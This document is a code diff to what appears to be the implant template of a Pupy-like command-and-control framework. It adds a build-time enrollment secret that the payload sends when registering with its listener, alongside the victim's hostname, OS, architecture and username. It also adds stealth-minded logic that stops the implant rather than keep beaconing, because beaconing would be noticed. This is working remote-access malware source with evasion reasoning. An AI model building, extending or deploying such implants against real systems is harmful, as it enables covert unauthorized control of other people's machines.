@@ -110,6 +110,13 @@ class StubConfig:
     tls: bool = False
     tls_cert_pem: str = ""
 
+    # Enrollment secret, presented when registering. TLS proves the listener to
+    # the agent; this proves the agent to the listener, so reaching the port is
+    # not by itself enough to be handed a session. Read it as a claim about who
+    # *built* the payload rather than who holds it: the string sits in the
+    # script, so anyone who recovers a dropped binary has it too.
+    auth_secret: str = ""
+
     # Relay
     relay_pipe: str = "pupypeer"       # pipe name (win) / unix-socket name (posix)
     relay_bind: str = "0.0.0.0"
@@ -624,6 +631,7 @@ class TransportError(Exception):
 
 TLS_ON = {{ cfg.tls }}
 TLS_CERT_PEM = {{ cfg.tls_cert_pem | tojson }}
+AUTH_SECRET = {{ cfg.auth_secret | tojson }}
 
 def pinned_tls_context():
     """A client context that trusts exactly one certificate: the listener's.
@@ -1496,12 +1504,21 @@ def _register(transport) -> str:
     ident = identity()
     resp = transport.request({
         "type": "register",
+        "auth": AUTH_SECRET,
         "hostname": ident["hostname"],
         "os": ident["os"],
         "arch": ident["arch"],
         "username": ident["user"],
         "agent_version": ident["version"],
     })
+    if resp.get("type") == "error" and resp.get("message") == "auth_failed":
+        # The listener is there and answered; it just does not know this agent.
+        # Retrying cannot change that — the secret was fixed at build time — and
+        # beaconing against a server that will never accept you is the loudest
+        # possible footprint. Say it once and stop.
+        _log("listener rejected our enrollment secret; rebuild this payload "
+             "from the team server that owns the listener", "error")
+        raise SystemExit(3)
     if resp.get("type") != "registered" or not resp.get("session_id"):
         raise TransportError(f"register refused: {resp!r}")
     return resp["session_id"]
